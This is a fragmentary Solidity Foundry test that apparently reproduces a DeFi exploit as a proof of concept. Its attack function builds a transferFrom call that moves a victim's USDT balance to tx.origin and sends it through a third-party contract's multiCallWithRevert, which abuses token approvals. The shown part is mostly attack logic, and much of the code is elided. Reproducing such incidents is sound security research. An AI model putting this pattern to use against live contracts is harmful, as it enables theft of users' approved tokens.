...
contract ContractTest is Test {
    ...
    function testPoC() public {
        emit log_named_decimal_uint(
            ...
            IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(attacker),
            18
        );
    ...
    function attack() public {
        ...
        if (bal < allw) {
            if (bal > 0) {
                ...
                calls[0] = abi.encode(bytes4(0x23b872dd), addr2, tx.origin, bal);
                // multiCallWithRevert(address token, bytes[] calldata data)
                (bool ok,) =
                    addr1.call(abi.encodeWithSignature("multiCallWithRevert(address,bytes[])", TetherToken, calls));
